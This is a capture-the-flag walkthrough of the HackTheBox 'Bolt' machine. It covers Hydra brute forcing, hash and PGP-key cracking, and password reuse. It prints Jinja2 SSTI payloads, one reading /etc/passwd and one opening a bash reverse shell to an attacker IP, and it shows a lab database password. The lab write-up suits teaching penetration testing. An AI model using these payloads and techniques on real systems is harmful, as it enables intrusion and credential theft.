---
title: "Walk-through of Bolt from HackTheBox"
header:
  teaser: /assets/images/2021-10-24-15-04-07.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Hydra
  - JohnTheRipper
  - Gobuster
  - SSTI
  - PGP
  - MySQL
---

## Machine Information

![bolt](/assets/images/2021-10-24-15-04-07.png)

Bolt is a medium machine on HackTheBox. We find a website with an archive that we download and discover lots of files and folders. Searching amongst them we find an sqlite database which we dump hashes from and crack to reveal admin credentials to a dashboard. After some enumeration we find a subdomain hosting a demo version of the main site. We use Server Side Template Injection to get a reverse shell as a user. More enumeration around the OS finds files with details of another subdomain and credentials for it. We also get access via SSH as one of the users, and find more information in another database. Eventually we have enough information to crack a pgp encrypted message and retrieve the root password.

<!--more-->

Skills required are web, OS and database enumeration knowledge. Skills learnt are SSTI and working with pgp encryption.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Bolt](https://www.hackthebox.eu/home/machines/profile/384) |
| Machine Release Date | 25th September 2021 |
| Date I Completed It | 28th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.114 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/bolt]
└─# nmap -p$ports -sC -sV -oA bolt 10.10.11.114
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 15:07 BST
Nmap scan report for 10.10.11.114
Host is up (0.029s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 14.93 seconds
```

We have two websites to look at, first try port 80:

![bolt-port80](/assets/images/2021-10-24-15-36-49.png)

Clicking around there isn't much to look at, the login button takes us here:

![bolt-port80-login](/assets/images/2021-10-24-15-38-41.png)

I tried SQLi and a few obvious user/password combinations, interestingly I get this when trying a user of admin:

![bolt-port80-admin](/assets/images/2021-10-24-15-39-38.png)

## Hydra Brute Force

So we can assume there's a admin user. I'll start Hydra going to try and brute force the login:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt bolt.htb http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-24 15:43:59
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://bolt.htb:80/login:username=^USER^&password=^PASS^:Invalid password
```

## File Download

While waiting for that I looked at the menu and found this download page:

![bolt-port80-download](/assets/images/2021-10-24-15-45-59.png)

I downloaded the tar file and had a look inside:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# tar -xf image.tar

┌──(root💀kali)-[~/htb/bolt]
└─# ls -l 
total 308728
drwxr-xr-x 2 root root      4096 Mar  5  2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
drwxr-xr-x 2 root root      4096 Mar  5  2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
drwxr-xr-x 2 root root      4096 Mar  5  2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
drwxr-xr-x 2 root root      4096 Mar  5  2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
drwxr-xr-x 2 root root      4096 Mar  5  2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
drwxr-xr-x 2 root root      4096 Mar  5  2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
drwxr-xr-x 2 root root      4096 Mar  5  2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
drwxr-xr-x 2 root root      4096 Mar  5  2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
-rw-r--r-- 1 root root      3797 Mar  5  2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
drwxr-xr-x 2 root root      4096 Mar  5  2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
drwxr-xr-x 2 root root      4096 Mar  5  2021 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
drwxr-xr-x 2 root root      4096 Mar  5  2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
-rw-r--r-- 1 kali kali 161765888 Oct 24 15:47 image.tar
-rw-r--r-- 1 root root      1002 Jan  1  1970 manifest.json
-rw-r--r-- 1 root root       119 Jan  1  1970 repositories
```

Looking in one of the folders we see another tar file:

```sh
┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]
└─# ls
json  layer.tar  VERSION
```

We can recursively extract all files from any subfolder with a tar in it:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# find . -type f -iname "*.tar" -print0 -execdir tar xf {} \; -delete
```

## Invite Code

Now we can grep across all files for interesting strings. This took a while but I eventually found this:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# grep -rn "Username" -A 3
<SNIP>
app/base/forms.py:17:    username = TextField('Username'     , id='username_create' , validators=[DataRequired()])
app/base/forms.py-18-    email    = TextField('Email'        , id='email_create'    , validators=[DataRequired(), Email()])
app/base/forms.py-19-    password = PasswordField('Password' , id='pwd_create'      , validators=[DataRequired()])
app/base/forms.py-20-    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])
```

I wonder what invite_code is? Which then got me this:

```text
┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]
└─# grep -rn "invite_code" -A 1
<SNIP>
app/base/routes.py:63:        code        = request.form['invite_code']
app/base/routes.py-64-        if code != 'XNSS-HSJW-3NGU-8XTJ':
```

## SQLite

I couldn't see where to use that at the moment so carried on looking. Later I found the sqlite database:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# grep -rn "sqlite3" -A 1
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/usr/lib/python3.6/site-packages/sqlalchemy/dialects/sqlite/base.py:195:   when using the pysqlite / sqlite3 SQLite driver.

┌──(root💀kali)-[~/htb/bolt]
└─# find . -type f -name "*sqlite3" 
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3

┌──(root💀kali)-[~/htb/bolt]
└─# sqlite3 ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

## Hash Cracking

Above I've opened the db file and dumped the admin password hash. Now we can try to crack it:

```sh
──(root💀kali)-[~/htb/bolt]
└─# echo "\$1\$sm1RceCh\$rSd3PygnS/6jlFDfF2J5q." > hash.txt

┌──(root💀kali)-[~/htb/bolt]
└─# nth --file hash.txt
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 

$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.

Most Likely 
MD5 Crypt, HC: 500 JtR: md5crypt
Cisco-IOS(MD5), HC: 500 JtR: md5crypt
FreeBSD MD5, HC: 500 JtR: md5crypt
```

Looks to be an md5crypt. let's get John on it:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# john hash.txt -format=md5crypt -w=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>         (?)
1g 0:00:00:00 DONE (2021-10-24 22:23) 2.000g/s 345600p/s 345600c/s 345600C/s doida..curtis13
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

That was quick, however looking back at Hydra we see it found the same password by brute forcing the login page a long time ago:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt bolt.htb http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-24 15:43:59
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://bolt.htb:80/login:username=^USER^&password=^PASS^:Invalid password
[STATUS] 6651.00 tries/min, 6651 tries in 00:01h, 14337748 to do in 35:56h, 64 active
[STATUS] 6250.33 tries/min, 18751 tries in 00:03h, 14325648 to do in 38:12h, 64 active
[80][http-post-form] host: bolt.htb   login: admin   password: <HIDDEN>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-24 16:11:02
```

We're here to learn so let's not be annoyed by this!

## Dashboard Access

Going back to the login page and using the credentials we now have we get to a dashboard:

![bolt-port80-admin-dash](/assets/images/2021-10-24-22-03-06.png)

There's not a lot here, but I see something in the Direct Chat box that seems of interest:

![bolt-port80-chat](/assets/images/2021-10-24-22-04-40.png)

## Gobuster

Sarah mentions a demo environment that is restricted to invite only, and earlier we found an invite code in the source. Time to look for subdomains:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bolt.htb               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://bolt.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/24 22:33:54 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: demo.bolt.htb (Status: 302) [Size: 219] 
===============================================================
2021/10/24 22:37:58 Finished
===============================================================
```

We have two, add these to /etc/hosts then looking at demo we see it's the same login page as before, only now we can create an account:

![bolt-port80-create](/assets/images/2021-10-24-22-45-01.png)

## Demo Portal

We can now log in to the demo portal and end up here:

![bolt-profile](/assets/images/2021-10-25-15-40-52.png)

Looking around inside the demo site I didn't find anything interesting, but looking at the bottom I notice the site is created using Flask:

![bolt-flask](/assets/images/2021-10-25-15-44-13.png)

Searching for exploits I found lots of good information like HackTricks [here](https://book.hacktricks.xyz/pentesting/pentesting-web/flask) and [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). Which lead me on to [this](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) cheat sheet and [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) guide.

## SSTI

After a bit of reading and trying out the examples I confirmed we have a Server Side Template Injection vulnerability in the profile section. From the PayloadsAllTheThings Jinja2 examples I found this one worked to read the passwd file:

```text
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

We just go to the settings of our user and put that in the name field:

![bolt-ssti](/assets/images/2021-10-25-15-56-27.png)

Click the submit button then switch to another browser tab and log in to mail.bolt.htb to see the email we've been sent:

![bolt-email](/assets/images/2021-10-25-16-01-48.png)

If we click on the link in that email we will get a second email confirming the changes have been made:

![bolt-email-confrim](/assets/images/2021-10-25-16-13-56.png)

## Reverse Shell

We can the contents is the passwd file, confirming we have server side code execution. Now we can move on to a reverse shell using the same method. I had to try a few different examples, eventually I found this one works:

```text
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.192/4444 0>&1"').read() }}
```

As before change the profile, submit, switch to mail and click on the link in it to initiate our reverse shell. Switching to our waiting netcat listener on Kali we see we're connected:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.192] from (UNKNOWN) [10.10.11.114] 60402
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$ 
```

First let's upgrade our shell:

```sh
www-data@bolt:/$ which python3
/usr/bin/python3
www-data@bolt:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:/$ ^Z  
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~/htb/bolt]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
www-data@bolt:/$ 
```

Check what users we have:

```text
www-data@bolt:/etc/passbolt$ ls -l /home
total 8
drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark
drwxr-x--- 16 eddie eddie 4096 Aug 26 23:55 eddie
```

## Passbolt Files

Two users but no access to them. Looking around for anything out of place before trying LinPEAS I found this folder:

```text
www-data@bolt:/$ find . \! -group root -d -maxdepth 2 2>/dev/null
<SNIP>
./etc/passbolt
```

It's in /etc and stands out from all the other folders in there as being owned by the www-data group not root. I did a quick check for anything juicy in there:

```sh
www-data@bolt:/etc/passbolt$ grep -rn "password"     
<SNIP>
app.php:106:            'password' => env('CACHE_DEFAULT_PASSWORD', null),
app.php:127:            'password' => env('CACHE_CAKECORE_PASSWORD', null),
app.php:149:            'password' => env('CACHE_CAKEMODEL_PASSWORD', null),
app.php:232:             * The keys host, port, timeout, username, password, client and tls
app.php:242:            'password' => env('EMAIL_TRANSPORT_DEFAULT_PASSWORD', null),
app.php:330:            'password' => env('DATASOURCES_DEFAULT_PASSWORD', ''),
app.php:361:            'password' => env('DATASOURCES_TEST_PASSWORD', 'secret'),
passbolt.php:3: * Passbolt ~ Open source password manager for teams
passbolt.php:42:            'password' => '<HIDDEN>',
```

Looking in the passbolt.php file we find another website, and database credentials:

```text
'App' => [
    // A base URL to use for absolute links.
    // The url where the passbolt instance will be reachable to your end users.
    // This information is need to render images in emails for example
    'fullBaseUrl' => 'https://passbolt.bolt.htb',
],
// Database configuration.
'Datasources' => [
    'default' => [
        'host' => 'localhost',
        'port' => '3306',
        'username' => 'passbolt',
        'password' => 'rT2;jW7<eY8!dX8}pQ8%',
        'database' => 'passboltdb',
    ],
],
```

This website on https is something we haven't looked at yet. I added the passbolt subdomain to my hosts file then browsed to it, we get another login form:

![bolt-passbolt](/assets/images/2021-10-25-17-10-28.png)

However this site isn't connected in any way to the demo one where we created an account with email address before. So this looks to be a dead end for now.

Going back to that passbolt.php file I tried the credentials for the two users we found in case they have reused the password:

```text
www-data@bolt:/etc/passbolt$ su clark
Password: 
su: Authentication failure
www-data@bolt:/etc/passbolt$ su eddie
Password: 
eddie@bolt:/etc/passbolt$ 
```

## SSH Access as Eddie

Success! Eddie has reused the password from the database config for his user account. Let's drop out of this service shell and log in as him over SSH:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# ssh eddie@bolt.htb
eddie@bolt.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)

You have mail.
Last login: Mon Oct 25 06:40:23 2021 from 10.10.14.75
eddie@bolt:~$ 
```

It says we have mail, let's check for files and folders belonging to Eddie to see where that could be:

```text
eddie@bolt:~$ find / -user eddie -not -path "/sys/*" -not -path "/proc/*" 2>/dev/null
/home/eddie/.config/google-chrome/Default/Storage/ext/nmmhkkegccagdldgiimedpiccmgmieda/def/Local Storage
/home/eddie/.config/google-chrome/Default/Storage/ext/nmmhkkegccagdldgiimedpiccmgmieda/def/Local Storage/leveldb
<SNIP>
/home/eddie/.config/google-chrome/TLSDeprecationConfig
/home/eddie/.config/update-notifier
/home/eddie/.config/goa-1.0
/home/eddie/.config/mimeapps.list
/home/eddie/.config/gnome-session
/home/eddie/.config/gnome-session/saved-session
/home/eddie/.config/ibus
/home/eddie/.config/ibus/bus
/home/eddie/.config/ibus/bus/70bb38312e5b4bdea2cdb2a9a1e36a4e-unix-0
/home/eddie/.config/monitors.xml
/home/eddie/.ssh
/home/eddie/Templates
/home/eddie/Downloads
/home/eddie/.mysql_history
/home/eddie/Public
/home/eddie/user.txt
/var/mail/eddie
```

We've found a Google Chrome profile in his home folder, which is definitely suspicious. We've also found the location of his mail, let's check it:

```text
eddie@bolt:~$ cat /var/mail/eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.
Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - 
there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

## PGP Private Key

A big clue there that Eddie has used Chrome to store a private key. Let's search his home folder for files containing the standard PGP key:

```sh
eddie@bolt:~$ grep -rn 'BEGIN PGP PRIVATE KEY BLOCK'
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:27039:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32061:            // BEGIN PGP PRIVATE KEY BLOCK
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32409:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

The binary 000003.log file matches. Let's look inside:

```text
eddie@bolt:~$ cat '.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log'
<SNIP>                                  
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/
r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/
qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAH+CQMINK+e85VtWtjguB8IR
<SNIP>
9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----
```

We see the full private key within the file. Cut out the block between the begin and end sections and paste/echo to a file on Kali so it looks like this:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_private_key                                         
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/
r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/
<SNIP>
\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----
```

Now use SED to remove the extra \\r and \\n:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_private_key | sed 's/\\\\r\\\\n/\n/g' > eddie_id_rsa

┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_id_rsa                                              
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
<SNIP>
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

## John The Ripper

We can use JohnTheRipper to try and crack the private key. First convert to a hash John can use:

```text
┌──(root💀kali)-[~/htb/bolt]
└─# john eddie_pgp_hash --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>   (Eddie Johnson)
1g 0:00:07:50 DONE (2021-10-26 22:31) 0.002124g/s 91.02p/s 91.02c/s 91.02C/s mhines..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## MySQL Access

That was easy, but what do we need this for? Looking back at the passbolt.php file we found earlier we had database credentials that we didn't try. Let's have a look in there now:

```sh
eddie@bolt:~$ mysql -u passbolt -p -e 'show databases;'
Enter password: 
+--------------------+
| Database           |
+--------------------+
| information_schema |
| passboltdb         |
+--------------------+

eddie@bolt:~$ mysql -u passbolt -p -e 'show tables from passboltdb;'
Enter password: 
+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
<SNIP>
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
eddie@bolt:~$ mysql -u passbolt -p -D passboltdb -e 'select * from secrets;'
Enter password: 
+--------------------------------------+--------------------------------------+--------------------------------------+--------------+---------------------+---------------------+
| id                                   | user_id                              | resource_id                          | data         | created             | modified            |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------+---------------------+---------------------+
| 643a8b12-c42c-4507-8646-2f8712af88f8 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | cd0270db-c83f-4f44-b7ac-76609b397746 |              | 2021-02-25 21:50:11 | 2021-03-06 15:34:36 |

-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
<SNIP>
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

## PGP Message

We find a table called secrets that has a message encrypted with the private key we've just cracked. Copy the PGP message from the database and paste in to a file on Kali:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_pgp_message 
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
<SNIP>
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

Now we have a message encrypted with the PGP, and the password to decode it now we've cracked the private key. So we can easily decrypt the file to see the contents, first import the private key:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# gpg --import eddie_pgp_priv_key
```

A windows pops up, enter the password we have just cracked:

```sh
┌────────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to import the OpenPGP secret key:  │
│ "Eddie Johnson <eddie@bolt.htb>"                               │
│ 2048-bit RSA key, ID 1C2741A3DC3B4ABD,                         │
│ created 2021-02-25.                                            │
│                                                                │
│                                                                │
│ Passphrase: **************____________________________________ │
│                                                                │
│         <OK>                                    <Cancel>       │
└────────────────────────────────────────────────────────────────┘
```

We see the secret key is imported:

```sh
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson <eddie@bolt.htb>" imported
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Now decrypt the message we've copied from the secrets table on the box:

```sh
┌──(root💀kali)-[~/htb/bolt]
└─# gpg -d eddie_pgp_message 
```

The window pops up again, enter or cracked password once more:

```sh
┌────────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to unlock the OpenPGP secret key:  │
│ "Eddie Johnson <eddie@bolt.htb>"                               │
│ 2048-bit RSA key, ID F65CA879A3D77FE4,                         │
│ created 2021-02-25 (main key ID 1C2741A3DC3B4ABD).             │
│                                                                │
│                                                                │
│ Passphrase: **************____________________________________ │
│                                                                │
│         <OK>                                    <Cancel>       │
└────────────────────────────────────────────────────────────────┘
```

Now we see the contents of the message:

```sh
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"<HIDDEN>","description":""}gpg: Signature made Sat 06 Mar 2021 03:33:54 PM GMT
